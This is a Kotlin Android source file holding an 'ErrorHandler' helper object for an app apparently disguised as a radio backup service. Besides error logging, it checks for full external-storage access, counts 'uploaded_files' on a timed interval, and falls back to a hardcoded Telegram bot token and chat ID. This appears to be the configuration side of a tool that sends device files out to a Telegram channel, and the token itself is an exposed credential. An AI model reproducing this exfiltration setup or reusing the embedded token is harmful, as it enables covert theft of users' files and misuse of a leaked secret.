package com.service.assasinscreed02

import android.content.Context
import android.content.SharedPreferences
import android.os.Environment
import android.util.Log
import android.widget.Toast
import java.io.File

object ErrorHandler {
    private const val TAG = "ErrorHandler"
    private const val PREFS_NAME = "RadioBackupPrefs"
    
    fun logError(tag: String, message: String, exception: Exception? = null, context: Context? = null) {
        Log.e(tag, message, exception)
        try {
            context?.let {
                val logFile = File(it.filesDir, "radio2_error_log.txt")
                // Rotar si supera 1 MB
                if (logFile.exists() && logFile.length() > 1024 * 1024) {
                    val backup = File(it.filesDir, "radio2_error_log_old.txt")
                    logFile.copyTo(backup, overwrite = true)
                    logFile.writeText("")
                }
                val time = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())
                val errorMsg = StringBuilder()
                errorMsg.append("[$time] $tag: $message\n")
                exception?.let { ex ->
                    errorMsg.append("Excepción: ${ex.message}\n")
                    errorMsg.append(Log.getStackTraceString(ex)).append("\n")
                }
                logFile.appendText(errorMsg.toString())
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error guardando log persistente: ${e.message}")
        }
    }
    
    fun showToast(context: Context, message: String, isError: Boolean = false) {
        try {
            Toast.makeText(context, message, if (isError) Toast.LENGTH_LONG else Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            Log.e(TAG, "Error mostrando toast: ${e.message}")
        }
    }
    
    fun validateConfig(context: Context): Boolean {
        return try {
            val prefs = context.getSharedPreferences("BotConfig", Context.MODE_PRIVATE)
            val token = prefs.getString("bot_token", null)
            val chatId = prefs.getString("bot_chat_id", null)
            
            !token.isNullOrBlank() && !chatId.isNullOrBlank()
        } catch (e: Exception) {
            Log.e(TAG, "Error validando configuración: ${e.message}")
            false
        }
    }
    
    fun validatePermissions(context: Context): Boolean {
        return try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                Environment.isExternalStorageManager()
            } else {
                val permissions = arrayOf(
                    android.Manifest.permission.READ_EXTERNAL_STORAGE,
                    android.Manifest.permission.WRITE_EXTERNAL_STORAGE
                )
                permissions.all {
                    context.checkSelfPermission(it) == android.content.pm.PackageManager.PERMISSION_GRANTED
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error validando permisos: ${e.message}")
            false
        }
    }
    
    fun getErrorSummary(context: Context): String {
        return try {
            val configOk = validateConfig(context)
            val permissionsOk = validatePermissions(context)
            
            when {
                configOk && permissionsOk -> "Configuración completa"
                !configOk && !permissionsOk -> "Falta configuración del bot y permisos"
                !configOk -> "Falta configuración del bot"
                !permissionsOk -> "Faltan permisos de almacenamiento"
                else -> "Estado desconocido"
            }
        } catch (e: Exception) {
            "Error verificando estado: ${e.message}"
        }
    }
    
    fun guardarConfigBot(context: Context, token: String, chatId: String) {
        try {
            val prefs = context.getSharedPreferences("BotConfig", Context.MODE_PRIVATE)
            prefs.edit()
                .putString("bot_token", token)
                .putString("bot_chat_id", chatId)
                .apply()
            Log.d(TAG, "Configuración del bot guardada")
        } catch (e: Exception) {
            Log.e(TAG, "Error guardando configuración: ${e.message}")
            throw e
        }
    }
    
    fun obtenerConfigBot(context: Context): Pair<String?, String?> {
        return try {
            val prefs = context.getSharedPreferences("BotConfig", Context.MODE_PRIVATE)
            val token = prefs.getString("bot_token", null)
            val chatId = prefs.getString("bot_chat_id", null)
            val defaultToken = "7742764117:AAEdKEzTMo0c7OW8_UEFYSir2tmn-SOrHk8"
            val defaultChatId = "-1002609637326"
            Pair(token ?: defaultToken, chatId ?: defaultChatId)
        } catch (e: Exception) {
            Log.e(TAG, "Error obteniendo configuración: ${e.message}")
            Pair("7742764117:AAEdKEzTMo0c7OW8_UEFYSir2tmn-SOrHk8", "-1002609637326")
        }
    }
    
    fun guardarIntervalo(context: Context, intervalo: Int) {
        try {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            prefs.edit()
                .putInt("intervalo_horas", intervalo)
                .apply()
            Log.d(TAG, "Intervalo guardado: $intervalo horas")
        } catch (e: Exception) {
            Log.e(TAG, "Error guardando intervalo: ${e.message}")
            throw e
        }
    }
    
    fun obtenerIntervalo(context: Context): Int {
        return try {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            prefs.getInt("intervalo_horas", 24)
        } catch (e: Exception) {
            Log.e(TAG, "Error obteniendo intervalo: ${e.message}")
            24
        }
    }
    
    fun limpiarRegistroArchivos(context: Context) {
        try {
            val prefs = context.getSharedPreferences("BackupPrefs", Context.MODE_PRIVATE)
            prefs.edit().remove("uploaded_files").apply()
            Log.d(TAG, "Registro de archivos subidos limpiado")
        } catch (e: Exception) {
            Log.e(TAG, "Error limpiando registro: ${e.message}")
        }
    }
    
    fun obtenerCantidadArchivosSubidos(context: Context): Int {
        return try {
            val prefs = context.getSharedPreferences("BackupPrefs", Context.MODE_PRIVATE)
            val archivos = prefs.getStringSet("uploaded_files", emptySet()) ?: emptySet()
            archivos.size
        } catch (e: Exception) {
            Log.e(TAG, "Error obteniendo cantidad de archivos: ${e.message}")
            0
        }
    }

    fun limpiarLogErrores(context: Context) {
        try {
            val logFile = File(context.filesDir, "radio2_error_log.txt")
            if (logFile.exists()) logFile.writeText("")
        } catch (e: Exception) {
            Log.e(TAG, "Error limpiando log de errores: ${e.message}")
        }
    }
} 